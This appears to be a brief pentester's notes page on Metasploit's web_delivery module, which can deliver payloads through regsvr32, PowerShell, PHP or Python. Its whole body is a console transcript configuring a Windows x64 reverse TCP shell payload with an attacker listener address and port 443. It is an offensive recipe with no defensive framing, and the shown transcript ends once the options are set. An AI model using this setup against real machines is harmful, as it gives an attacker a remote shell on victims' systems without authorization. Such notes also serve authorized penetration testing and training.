# Web Delivery

## Web Delivery 

{% hint style="warning" %}
## can be used with RegSrv32.exe and other
{% endhint %}

Set target can be php, regsrv32, powershell, python ...

```csharp
msf5 exploit(multi/script/web_delivery) > use exploit/multi/script/web_delivery \ 
 > Interrupt: use the 'exit' command to quit                                                                                                                 
msf5 exploit(multi/script/web_delivery) > use exploit/multi/script/web_delivery  
msf5 exploit(multi/script/web_delivery) > set target 2                             
target => 2                            
msf5 exploit(multi/script/web_delivery) > set payload windows/x64/shell/reverse_tcp
payload => set payload windows/x64/shell/reverse_tcp                                                                                                                  
msf5 exploit(multi/script/web_delivery) > set LHOST 10.110.0.61                    
LHOST => 10.110.0.61                                                          
msf5 exploit(multi/script/web_delivery) > set lport 443                            
lport => 443  
```



